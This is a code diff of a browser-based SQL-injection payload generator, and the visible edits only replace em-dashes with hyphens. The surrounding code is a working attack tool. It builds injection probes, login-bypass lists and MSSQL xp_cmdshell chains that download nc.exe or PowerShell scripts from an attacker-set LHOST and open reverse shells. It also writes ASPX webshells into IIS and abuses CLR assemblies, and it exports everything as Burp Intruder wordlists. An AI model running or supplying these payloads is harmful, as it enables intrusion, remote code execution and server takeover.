@@ -38,7 +38,7 @@
   --shadow:       none;
   --mono: 'JetBrains Mono', 'Courier New', monospace;
 
-  /* tag colours — hardcoded so they survive both themes */
+  /* tag colours - hardcoded so they survive both themes */
   --db-mssql-bg:#1a3050; --db-mssql-fg:#7ec0f0; --db-mssql-bd:#2a4870;
   --db-mysql-bg:#1a3a1a; --db-mysql-fg:#7ec87e; --db-mysql-bd:#2a5a2a;
   --db-pg-bg:#1a2a50;    --db-pg-fg:#7ea8f0;    --db-pg-bd:#2a3870;
@@ -652,7 +652,7 @@ body {
       </div>
     </div>
     <div class="field">
-      <label>HTTP PORT (file server — certutil/wget)</label>
+      <label>HTTP PORT (file server - certutil/wget)</label>
       <input type="text" id="http_port" placeholder="7331" value="7331" oninput="liveRegen()">
     </div>
   </div>
@@ -795,15 +795,15 @@ body {
     <button class="fmt-btn" id="fmt-chain" onclick="setFmt('chain')" style="background:rgba(232,82,82,0.12);border-color:var(--red-dim);color:var(--red);font-weight:600">⑤ Attack Chain</button>
     <button class="fmt-btn" id="fmt-revshells" onclick="setFmt('revshells')" style="background:rgba(61,220,132,0.08);border-color:var(--green-dim);color:var(--green);font-weight:600">⑥ RevShells</button>
     <button class="copy-all-btn" id="copy-all-btn" onclick="copyAll()" style="display:none">⎘ copy all payloads</button>
-    <button class="intruder-wl-btn" id="intruder-rce-btn" onclick="copyIntruderWordlist(true)" style="display:none" title="RCE payloads only — shell delivery chain in order">🎯 RCE CHAIN ONLY</button>
+    <button class="intruder-wl-btn" id="intruder-rce-btn" onclick="copyIntruderWordlist(true)" style="display:none" title="RCE payloads only - shell delivery chain in order">🎯 RCE CHAIN ONLY</button>
     <button class="intruder-wl-btn" id="intruder-wl-btn" onclick="copyIntruderWordlist(false)" style="display:none" title="All technique payloads deduplicated">⚔ ALL WORDLIST</button>
-    <button class="intruder-wl-btn" id="nuke-all-btn" onclick="copyNukeAll()" title="ALL DBs × ALL techs × ALL contexts — full nuke wordlist. Uses current LHOST/RPORT. No chip selection needed. ✅ Keep URL-encode CHECKED in Intruder (form POST/GET injection). Uncheck ONLY for JSON/header injection." style="background:rgba(232,82,82,0.15);border-color:var(--red);color:var(--red);font-weight:700">☢ NUKE ALL</button>
-    <button class="intruder-wl-btn" id="revshells-copy-btn" onclick="copyRevShellsBtn(this)" title="ALL DBs × RCE only — pure revshell delivery payloads. Uses LHOST/LPORT. Paste into Intruder. Keep URL-encode CHECKED." style="background:rgba(61,220,132,0.12);border-color:var(--green);color:var(--green);font-weight:700">🐚 REVSHELLS LIST</button>
+    <button class="intruder-wl-btn" id="nuke-all-btn" onclick="copyNukeAll()" title="ALL DBs × ALL techs × ALL contexts - full nuke wordlist. Uses current LHOST/RPORT. No chip selection needed. ✅ Keep URL-encode CHECKED in Intruder (form POST/GET injection). Uncheck ONLY for JSON/header injection." style="background:rgba(232,82,82,0.15);border-color:var(--red);color:var(--red);font-weight:700">☢ NUKE ALL</button>
+    <button class="intruder-wl-btn" id="revshells-copy-btn" onclick="copyRevShellsBtn(this)" title="ALL DBs × RCE only - pure revshell delivery payloads. Uses LHOST/LPORT. Paste into Intruder. Keep URL-encode CHECKED." style="background:rgba(61,220,132,0.12);border-color:var(--green);color:var(--green);font-weight:700">🐚 REVSHELLS LIST</button>
     <div class="fmt-hint" id="fmt-hint"></div>
   </div>
 
   <div class="ip-warning" id="ip-warning">
-    ⚠ LHOST not set — payloads with callbacks show <b style="color:var(--red)">LHOST</b> placeholder. Set IP above and regenerate.
+    ⚠ LHOST not set - payloads with callbacks show <b style="color:var(--red)">LHOST</b> placeholder. Set IP above and regenerate.
   </div>
 
   <div id="payloads-container" style="flex:1">
@@ -958,15 +958,15 @@ function updateFmtHint() {
   if (currentFmt === 'burp') {
     el.innerHTML = '<b>Burp:</b> Repeater → Raw tab → Ctrl+A, Ctrl+V → Send';
   } else if (currentFmt === 'intruder') {
-    el.innerHTML = '<b>Intruder:</b> Export Wordlist → Intruder → Payloads → Paste — comments stripped, one payload per line';
+    el.innerHTML = '<b>Intruder:</b> Export Wordlist → Intruder → Payloads → Paste - comments stripped, one payload per line';
   } else if (currentFmt === 'shells') {
     el.innerHTML = '<b>Shell Gen:</b> pick type in sidebar → copy raw, penelope-style, or xp_cmdshell wrapper';
   } else if (currentFmt === 'chain') {
-    el.innerHTML = '<b>Attack Chain:</b> MSSQL xp_cmdshell → certutil → nc.exe — copy each step to Repeater in order';
+    el.innerHTML = '<b>Attack Chain:</b> MSSQL xp_cmdshell → certutil → nc.exe - copy each step to Repeater in order';
   } else if (currentFmt === 'revshells') {
-    el.innerHTML = '<b>RevShells:</b> ALL DBs × RCE payloads — SQLi → revshell delivery. Set LHOST/LPORT → copy card or 🐚 REVSHELLS LIST for Intruder';
+    el.innerHTML = '<b>RevShells:</b> ALL DBs × RCE payloads - SQLi → revshell delivery. Set LHOST/LPORT → copy card or 🐚 REVSHELLS LIST for Intruder';
   } else {
-    el.innerHTML = '<b>Clean:</b> paste directly into target param field — includes notes for manual use';
+    el.innerHTML = '<b>Clean:</b> paste directly into target param field - includes notes for manual use';
   }
 }
 
@@ -1012,7 +1012,7 @@ function copyAll() {
   let text = '';
 
   if (currentFmt === 'burp') {
-    // One Burp request per intruder line across all cards — each step is usable
+    // One Burp request per intruder line across all cards - each step is usable
     const allSteps = [];
     lastPayloads.forEach(p => {
       (p.burpReqSteps || []).forEach(s => allSteps.push(s));
@@ -1027,7 +1027,7 @@ function copyAll() {
     return navigator.clipboard.writeText(text).catch(() => fbCopy(text));
 
   } else {
-    // Clean / intruder: injection values only — no comments, no notes
+    // Clean / intruder: injection values only - no comments, no notes
     const seen = new Set();
     const lines = [];
     lastPayloads.forEach(p => {
@@ -1049,7 +1049,7 @@ function fbCopy(text) {
   ta.value = text; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta);
 }
 
-// Quick per-DB RCE chain copy — works regardless of current filter selection
+// Quick per-DB RCE chain copy - works regardless of current filter selection
 function copyDbRceChain(db, btn) {
   const ip   = document.getElementById('ip').value.trim()        || 'LHOST';
   const port = document.getElementById('port').value.trim()      || '4444';
@@ -1120,7 +1120,7 @@ function stripForIntruder(rawPayload) {
     const t = line.trim();
     if (!t) return null;
     if (t.startsWith('--') || t.startsWith('#') || t.startsWith('/*') || t.startsWith('<!--')) return null;
-    // strip pure structural XML lines (no injection chars) — e.g. <SOAP-ENV:Body>, </ns1:getUser>
+    // strip pure structural XML lines (no injection chars) - e.g. <SOAP-ENV:Body>, </ns1:getUser>
     if (/^<[^>]+>$/.test(t) && !/['"`\\]|UNION|SELECT|SYSTEM|DOCTYPE|ENTITY/i.test(t)) return null;
     const stripped = t.replace(/\s{2,}(--|#)\s+[A-Za-z(].+$/, '').trim();
     if (!stripped || stripped === '--' || stripped === '--+' || stripped === '#') return null;
@@ -1178,8 +1178,8 @@ function copyNukeAll() {
   const ctype     = document.getElementById('ctype').value;
 
   const ALL_DBS    = ['mssql','mysql','pg','oracle','sqlite','h2','db2','sybase'];
-  const ALL_TECHS  = ['rce','union','blind','oob','err','fw','bypass','auth','detect']; // 'second' excluded — stored payloads, not direct injection compatible
-  const ALL_CTXS   = ['post','get','json','header','cookie']; // xml excluded — full-body payloads, not value-substitution compatible
+  const ALL_TECHS  = ['rce','union','blind','oob','err','fw','bypass','auth','detect']; // 'second' excluded - stored payloads, not direct injection compatible
+  const ALL_CTXS   = ['post','get','json','header','cookie']; // xml excluded - full-body payloads, not value-substitution compatible
   const ALL_EXTRAS = ['ps','cmd','certutil','bitsadmin','mshta','regsvr32'];
 
   const raw = buildPayloads(ip, port, http_port, param, ctype, ALL_EXTRAS, ALL_DBS, ALL_TECHS, ALL_CTXS)
@@ -1197,7 +1197,7 @@ function copyNukeAll() {
 
   const text = lines.join('\n');
   navigator.clipboard.writeText(text).then(() => {
-    btn.textContent = `✓ ${lines.length} lines — paste to Intruder (keep URL-encode CHECKED for form/GET)`;
+    btn.textContent = `✓ ${lines.length} lines - paste to Intruder (keep URL-encode CHECKED for form/GET)`;
     btn.classList.add('copied');
     setTimeout(() => { btn.textContent = orig; btn.classList.remove('copied'); }, 3000);
   }).catch(() => {
@@ -1209,7 +1209,7 @@ function copyNukeAll() {
 }
 
 // ═══════════════════════════════════════════════════════
-// BURP REQUEST BUILDER — correct Content-Length
+// BURP REQUEST BUILDER - correct Content-Length
 // ═══════════════════════════════════════════════════════
 function extractFirstPayloadLine(rawPayload) {
   return (rawPayload.split('\n').find(l => l.trim() && !l.trim().startsWith('--') && !l.trim().startsWith('#') && !l.trim().startsWith('/*')) || rawPayload.split('\n')[0]).trim();
@@ -1221,7 +1221,7 @@ function buildBurpRequest(rawPayload, cfg, mark) {
   const injectValue = extractFirstPayloadLine(rawPayload);
   const injectDisplay = mark ? `§${injectValue}§` : injectValue;
 
-  // GET — params in URL, no body
+  // GET - params in URL, no body
   if (method === 'GET') {
     let qs = `${encodeURIComponent(param)}=${encodeURIComponent(injectDisplay)}`;
     if (extraParams) qs += `&${extraParams}`;
@@ -1239,7 +1239,7 @@ function buildBurpRequest(rawPayload, cfg, mark) {
     return lines.join('\r\n');
   }
 
-  // POST / PUT — body-based injection
+  // POST / PUT - body-based injection
   let body = '';
   let ct = '';
 
@@ -1355,7 +1355,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
   // ── FINGERPRINT ────────────────────────────────────
   if (techs.includes('detect')) {
     all.push({
-      id:'fp-basic', title:'Step 0 — trigger an error (confirm injection point exists)',
+      id:'fp-basic', title:'Step 0 - trigger an error (confirm injection point exists)',
       db:['mssql','mysql','pg','oracle','sqlite','h2','db2','sybase'],
       tech:['detect'], ctx:['post','get','json','cookie','header'],
       payload: () => `'\n''\n\\'\n"\n""\n\\"\n)\n')\n'')\n\")\n`+"`"+`\n'--\n'#\n'/*\n'/**/--\n-- (place these one per Intruder attempt)\n-- any DB error response = injectable`,
@@ -1363,7 +1363,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
     });
 
     all.push({
-      id:'fp-bool', title:'Boolean probe — universal injection test',
+      id:'fp-bool', title:'Boolean probe - universal injection test',
       db:['mssql','mysql','pg','oracle','sqlite','h2','db2','sybase'],
       tech:['detect'], ctx:['post','get','json','cookie','header'],
       payload: () => `' AND '1'='1    -- TRUE  (normal response)\n' AND '1'='2    -- FALSE (different response)\n' AND 1=1--\n' AND 1=1#         (MySQL)\n'/**/AND/**/1=1-- (space WAF bypass)\n') AND ('1'='1   (parenthesis context)`,
@@ -1371,7 +1371,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
     });
 
     all.push({
-      id:'fp-time', title:'Time-based engine fingerprint — all DBs',
+      id:'fp-time', title:'Time-based engine fingerprint - all DBs',
       db:['mssql','mysql','pg','oracle','sqlite'],
       tech:['detect','blind'], ctx:['post','get','json'],
       payload: () => `'; WAITFOR DELAY '0:0:5'--                              -- MSSQL (5s delay)\n' AND SLEEP(5)--                                        -- MySQL\n' AND 1=(SELECT 1 FROM pg_sleep(5))--                   -- PostgreSQL\n' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)--              -- Oracle\n' AND 1=(SELECT LIKE('ABCDE',randomblob(500000000/2)))--  -- SQLite (CPU burn)`,
@@ -1379,7 +1379,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
     });
 
     all.push({
-      id:'fp-err', title:'Error-based version leak — all major DBs',
+      id:'fp-err', title:'Error-based version leak - all major DBs',
       db:['mssql','mysql','pg','oracle'],
       tech:['detect','err'], ctx:['post','get'],
       payload: () => `' AND 1=CONVERT(int,(SELECT @@version))--             -- MSSQL: version in error msg\n' AND extractvalue(1,concat(0x7e,version()))--         -- MySQL: version in XPath error\n' AND CAST(version() AS int)=1--                      -- PostgreSQL: version in cast error\n' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))-- -- Oracle`,
@@ -1387,7 +1387,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
     });
 
     all.push({
-      id:'fp-comment', title:'Comment syntax probe — determine DB family',
+      id:'fp-comment', title:'Comment syntax probe - determine DB family',
       db:['mssql','mysql','pg','oracle','sqlite'],
       tech:['detect'], ctx:['post','get'],
       payload: () => `'--            -- works: MSSQL, PostgreSQL, Oracle, SQLite\n'#             -- works: MySQL only\n'/**/          -- works: MySQL, MSSQL, PostgreSQL (block comment)\nadmin'-- -     -- MySQL (space after -- is required in some parsers)\n' OR 1=1;--   -- stacked: MSSQL, PostgreSQL, SQLite (NOT Oracle)`,
@@ -1398,7 +1398,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
   // ── AUTH BYPASS ─────────────────────────────────────
   if (techs.includes('auth')) {
     all.push({
-      id:'auth-all', title:'Auth bypass — login form polyglots (Intruder-ready list)',
+      id:'auth-all', title:'Auth bypass - login form polyglots (Intruder-ready list)',
       db:['mssql','mysql','pg','oracle','sqlite','h2','db2','sybase'],
       tech:['auth'], ctx:['post','get'],
       payload: () => `admin'--\nadmin'/*\nadmin'#\nadmin' OR '1'='1\nadmin' OR '1'='1'--\nadmin'-- -\n' OR 1=1--\n' OR 1=1#\n' OR 1=1/*\n' OR 1=1-- -\n') OR '1'='1'--\n') OR ('1'='1\n') OR 1=1--\n' OR ''=''\n' OR 'x'='x\n' OR 1-- -\n'=''OR--\n' OR 1=1 LIMIT 1;--\n" OR 1=1--\n" OR "1"="1\nadmin"--\n1' OR '1'='1\n1 OR 1=1--\n\\' OR 1=1--`,
@@ -1406,7 +1406,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
     });
 
     all.push({
-      id:'auth-truncation', title:'Auth bypass — SQL truncation attack (long username)',
+      id:'auth-truncation', title:'Auth bypass - SQL truncation attack (long username)',
       db:['mysql','mssql','pg'],
       tech:['auth'], ctx:['post','get'],
       payload: () => `-- If app stores username in VARCHAR(20):\n-- Input "admin               x" (admin + 20 spaces + x = 26 chars)\n-- MySQL truncates to "admin               " → matches stored "admin"\nadmin                    x\nadmin                   '\nadmin@email.com          x\n\n-- With quotes (PostgreSQL strict mode may reject):\n-- Also try: admin\\x00 (null byte truncation in some frameworks)`,
@@ -1417,7 +1417,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
   // ── SECOND ORDER ──────────────────────────────────────
   if (techs.includes('second')) {
     all.push({
-      id:'second-order-store', title:'Second-Order SQLi — stored payloads (Phase 1: inject and store)',
+      id:'second-order-store', title:'Second-Order SQLi - stored payloads (Phase 1: inject and store)',
       db:['mssql','mysql','pg','oracle','sqlite'],
       tech:['second'], ctx:['post','get','json'],
       payload: () => `-- Phase 1: Register/store these as username/firstname/profile field:\nadmin'--\nadmin' OR '1'='1\n' UNION SELECT 1,2,3--\n' AND 1=CONVERT(int,@@version)--\n'; EXEC xp_cmdshell 'whoami';--\n1'; WAITFOR DELAY '0:0:5';--\n\\'; exec xp_cmdshell('whoami');--\n\n-- Phase 2: The payload fires when the stored value is used in another query:\n-- Example triggers:\n--   Password change: UPDATE users SET pwd=? WHERE username='<STORED>'\n--   Profile view: SELECT * FROM profiles WHERE user='<STORED>'\n--   Admin lookup: SELECT * FROM users WHERE name='<STORED>'\n--   Log viewer: SELECT * FROM logs WHERE user='<STORED>'`,
@@ -1425,7 +1425,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
     });
 
     all.push({
-      id:'second-order-trigger', title:'Second-Order SQLi — trigger points and test actions',
+      id:'second-order-trigger', title:'Second-Order SQLi - trigger points and test actions',
       db:['mssql','mysql','pg','oracle','sqlite'],
       tech:['second'], ctx:['post','get','json'],
       payload: () => `-- Common trigger actions to test after storing payload in username/field:\n\n-- 1. Password change (most common OSCP scenario):\n-- POST /change-password with old_password=x&new_password=y\n-- Query fires: UPDATE users SET password='y' WHERE username='<payload>'\n\n-- 2. Profile update / view:\n-- GET /profile or POST /profile/update\n\n-- 3. Add-to-cart / purchase (e-commerce apps):\n-- Query: SELECT * FROM products WHERE purchased_by='<payload>'\n\n-- 4. Message/comment display:\n-- SELECT * FROM messages WHERE sender='<payload>'\n\n-- 5. Search with stored preference:\n-- SELECT * FROM items WHERE category='<payload>'\n\n-- Detection: compare response time on trigger with WAITFOR/SLEEP payload stored`,
@@ -1438,7 +1438,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
     if (techs.includes('rce')) {
       all.push({
-        id:'mssql-enable', title:'MSSQL — enable xp_cmdshell (if disabled)',
+        id:'mssql-enable', title:'MSSQL - enable xp_cmdshell (if disabled)',
         db:['mssql'], tech:['rce'], ctx:['post','get','json'],
         payload: () => `'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\nEXEC xp_cmdshell 'whoami';--`,
         note:'Run this first if xp_cmdshell payloads return no output. Requires sysadmin role.'
@@ -1446,14 +1446,14 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
       if (extras.includes('ps')) {
         all.push({
-          id:'mssql-ps-iex', title:'MSSQL — xp_cmdshell + PowerShell IEX download cradle',
+          id:'mssql-ps-iex', title:'MSSQL - xp_cmdshell + PowerShell IEX download cradle',
           db:['mssql'], tech:['rce'], ctx:['post','get','json'],
           payload: (ip,port) => `'; EXEC xp_cmdshell 'wmic process call create "powershell -nop -w h -c (New-Object Net.WebClient).DownloadString(''http://${ip}:${HP}/s.ps1'')|IEX"';--`,
           note:(ip,port) => `File server: python3 -m http.server ${HP} (serve Invoke-PowerShellTcp.ps1). Listener: nc -lvnp ${port}`
         });
 
         all.push({
-          id:'mssql-ps-b64', title:'MSSQL — xp_cmdshell + PowerShell TCP rev shell (base64)',
+          id:'mssql-ps-b64', title:'MSSQL - xp_cmdshell + PowerShell TCP rev shell (base64)',
           db:['mssql'], tech:['rce'], ctx:['post','get','json'],
           payload: (ip,port) => {
             // generate correct base64 for: $c=New-Object Net.Sockets.TCPClient("IP",PORT);...
@@ -1465,7 +1465,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
         });
 
         all.push({
-          id:'mssql-ps-wget', title:'MSSQL — xp_cmdshell + PowerShell wget drop & exec',
+          id:'mssql-ps-wget', title:'MSSQL - xp_cmdshell + PowerShell wget drop & exec',
           db:['mssql'], tech:['rce'], ctx:['post','get'],
           payload: (ip,port) => `'; EXEC xp_cmdshell 'wmic process call create "powershell -nop -c (New-Object Net.WebClient).DownloadFile(''http://${ip}:${HP}/nc.exe'',''C:\\Windows\\Temp\\nc.exe'');Start-Process C:\\Windows\\Temp\\nc.exe ''${ip} ${port} -e cmd.exe''"';--`,
           note:(ip,port) => `File server: python3 -m http.server ${HP} (serve nc.exe). Listener: nc -lvnp ${port}`
@@ -1474,7 +1474,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
       if (extras.includes('cmd')) {
         all.push({
-          id:'mssql-cmd-certutil', title:'MSSQL — xp_cmdshell + certutil download + nc exec',
+          id:'mssql-cmd-certutil', title:'MSSQL - xp_cmdshell + certutil download + nc exec',
           db:['mssql'], tech:['rce'], ctx:['post','get'],
           payload: (ip,port) => `'; EXEC xp_cmdshell 'certutil -urlcache -split -f http://${ip}:${HP}/nc.exe %TEMP%\\nc.exe && wmic process call create "cmd /c %TEMP%\\nc.exe ${ip} ${port} -e cmd.exe"';--`,
           note:(ip,port) => `File server: python3 -m http.server ${HP} (serve nc.exe from /tmp). Listener: nc -lvnp ${port}`
@@ -1483,7 +1483,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
       if (extras.includes('certutil')) {
         all.push({
-          id:'mssql-certutil', title:'MSSQL — certutil base64 decode (AV bypass)',
+          id:'mssql-certutil', title:'MSSQL - certutil base64 decode (AV bypass)',
           db:['mssql'], tech:['rce'], ctx:['post','get'],
           payload: (ip,port) => `-- 1. base64-encode your payload on Kali:\n--    base64 -w0 nc.exe > nc.b64\n-- 2. serve and decode on target:\n'; EXEC xp_cmdshell 'certutil -urlcache -split -f http://${ip}:${HP}/nc.b64 %TEMP%\\nc.b64';--\n'; EXEC xp_cmdshell 'certutil -decode %TEMP%\\nc.b64 %TEMP%\\nc.exe';--\n'; EXEC xp_cmdshell 'wmic process call create "cmd /c %TEMP%\\nc.exe ${ip} ${port} -e cmd.exe"';--`,
           note:`Evades some signature-based AV that flags raw PE downloads. File server on port ${HP}.`
@@ -1492,7 +1492,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
       if (extras.includes('bitsadmin')) {
         all.push({
-          id:'mssql-bits', title:'MSSQL — bitsadmin (older Windows / PS policy bypass)',
+          id:'mssql-bits', title:'MSSQL - bitsadmin (older Windows / PS policy bypass)',
           db:['mssql'], tech:['rce'], ctx:['post','get'],
           payload: (ip,port) => `'; EXEC xp_cmdshell 'bitsadmin /transfer job /priority foreground http://${ip}:${HP}/nc.exe %TEMP%\\nc.exe && wmic process call create "cmd /c %TEMP%\\nc.exe ${ip} ${port} -e cmd.exe"';--`,
           note:'Works when PowerShell.exe execution is restricted but bitsadmin is not.'
@@ -1501,53 +1501,53 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
       if (extras.includes('mshta')) {
         all.push({
-          id:'mssql-mshta', title:'MSSQL — mshta HTA delivery (AMSI bypass path)',
+          id:'mssql-mshta', title:'MSSQL - mshta HTA delivery (AMSI bypass path)',
           db:['mssql'], tech:['rce'], ctx:['post','get'],
           payload: (ip,port) => `'; EXEC xp_cmdshell 'mshta http://${ip}:${HP}/shell.hta';--\n-- Generate HTA on Kali: msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip} LPORT=${port} -f hta-psh -o shell.hta`,
-          note:'mshta.exe runs HTA files — useful when powershell.exe is monitored.'
+          note:'mshta.exe runs HTA files - useful when powershell.exe is monitored.'
         });
       }
 
       all.push({
-        id:'mssql-curl', title:'MSSQL — xp_cmdshell + curl.exe (native Win10/2019+, no certutil)',
+        id:'mssql-curl', title:'MSSQL - xp_cmdshell + curl.exe (native Win10/2019+, no certutil)',
         db:['mssql'], tech:['rce'], ctx:['post','get'],
         payload: (ip,port) => `'; EXEC xp_cmdshell 'curl -o %TEMP%\\nc.exe http://${ip}:${HP}/nc.exe && wmic process call create "cmd /c %TEMP%\\nc.exe ${ip} ${port} -e cmd.exe"';--`,
         note:(ip,port) => `curl.exe native since Win10 1803 / Server 2019. No PowerShell needed. File server: python3 -m http.server ${HP}. Listener: nc -lvnp ${port}`
       });
 
       all.push({
-        id:'mssql-aspx-echo', title:'MSSQL — ASPX webshell via echo (no download, pure blind RCE)',
+        id:'mssql-aspx-echo', title:'MSSQL - ASPX webshell via echo (no download, pure blind RCE)',
         db:['mssql'], tech:['rce'], ctx:['post','get'],
-        payload: (ip,port) => `-- Write ASPX webshell with echo — no file download needed, pure OS commands\n-- Step 1: write shell to IIS web root\n'; EXEC xp_cmdshell 'echo ^<%@ Page Language="C#" %^>^<%Response.Write(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["c"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start()?new System.IO.StreamReader(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["c"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start().StandardOutput.ReadToEnd()):"");%^> > C:\\inetpub\\wwwroot\\x.aspx';--\n\n-- Simpler minimal ASPX cmd shell:\n'; EXEC xp_cmdshell 'echo ^<%@ Page Language="C#"%^>^<% var p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+Request["c"];p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());%^> > C:\\inetpub\\wwwroot\\sh.aspx';--\n\n-- Step 2: trigger reverse shell via curl\n'; EXEC xp_cmdshell 'curl "http://127.0.0.1/sh.aspx?c=powershell+-nop+-w+hidden+-enc+${b64Encode(`$c=New-Object Net.Sockets.TCPClient("${ip}",${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+"PS "+(pwd).Path+"> ";$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush();}`)}';--`,
+        payload: (ip,port) => `-- Write ASPX webshell with echo - no file download needed, pure OS commands\n-- Step 1: write shell to IIS web root\n'; EXEC xp_cmdshell 'echo ^<%@ Page Language="C#" %^>^<%Response.Write(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["c"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start()?new System.IO.StreamReader(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["c"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start().StandardOutput.ReadToEnd()):"");%^> > C:\\inetpub\\wwwroot\\x.aspx';--\n\n-- Simpler minimal ASPX cmd shell:\n'; EXEC xp_cmdshell 'echo ^<%@ Page Language="C#"%^>^<% var p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+Request["c"];p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());%^> > C:\\inetpub\\wwwroot\\sh.aspx';--\n\n-- Step 2: trigger reverse shell via curl\n'; EXEC xp_cmdshell 'curl "http://127.0.0.1/sh.aspx?c=powershell+-nop+-w+hidden+-enc+${b64Encode(`$c=New-Object Net.Sockets.TCPClient("${ip}",${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+"PS "+(pwd).Path+"> ";$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush();}`)}';--`,
         note:(ip,port) => `No outbound HTTP needed. Echo writes webshell locally, curl triggers it on 127.0.0.1. nc -lvnp ${port}`
       });
 
       all.push({
-        id:'mssql-ole', title:'MSSQL — OLE Automation (xp_cmdshell alternative)',
+        id:'mssql-ole', title:'MSSQL - OLE Automation (xp_cmdshell alternative)',
         db:['mssql'], tech:['rce'], ctx:['post','get'],
         payload: (ip,port) => `'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;\nEXEC sp_configure 'Ole Automation Procedures',1; RECONFIGURE;\nDECLARE @o int;\nEXEC sp_OACreate 'wscript.shell',@o OUT;\nEXEC sp_OAMethod @o,'run',NULL,'cmd /c powershell -nop -w h -c "IEX(iwr http://${ip}:${port}/s.ps1 -useb)"';--`,
         note:'Requires different privilege path than xp_cmdshell. Use when xp_cmdshell is locked down.'
       });
 
       all.push({
-        id:'mssql-clr', title:'MSSQL — CLR Assembly RCE (bypasses xp_cmdshell disable)',
+        id:'mssql-clr', title:'MSSQL - CLR Assembly RCE (bypasses xp_cmdshell disable)',
         db:['mssql'], tech:['rce'], ctx:['post','get'],
         payload: (ip,port) => {
           const psB64 = b64Encode(`$c=New-Object Net.Sockets.TCPClient("${ip}",${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+"PS "+(pwd).Path+"> ";$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush();}`);
-          return `-- CLR bypasses xp_cmdshell disable — only needs sp_configure 'clr enabled'\n-- Step 1: enable CLR\n'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE;--\n\n-- Step 2: enable trustworthy on current DB (required for UNSAFE assembly)\n'; ALTER DATABASE master SET TRUSTWORTHY ON;--\n\n-- Step 3: create assembly from hex DLL (use msfvenom or WarSQLKit)\n-- msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip} LPORT=${port} -f dll -o /tmp/clr.dll\n-- python3 -c "print('0x'+open('/tmp/clr.dll','rb').read().hex())" > /tmp/clr.hex\n'; CREATE ASSEMBLY clr_exec FROM 0x4D5A...<HEX_DLL>... WITH PERMISSION_SET=UNSAFE;--\n\n-- Step 4: create stored procedure from CLR method\n'; CREATE PROCEDURE [dbo].[sp_clr_exec] @cmd NVARCHAR(4000) AS EXTERNAL NAME clr_exec.[StoredProcedures].[exec_cmd];--\n\n-- Step 5: execute\n'; EXEC sp_clr_exec 'powershell -nop -w hidden -enc ${psB64}';--\n\n-- SHORTCUT: use WarSQLKit (pre-built CLR DLL for SQLi):\n-- https://github.com/NYAN-x-CAT/WarSQLKit\n-- Then: EXEC sp_WarSQLKit 'whoami';`;
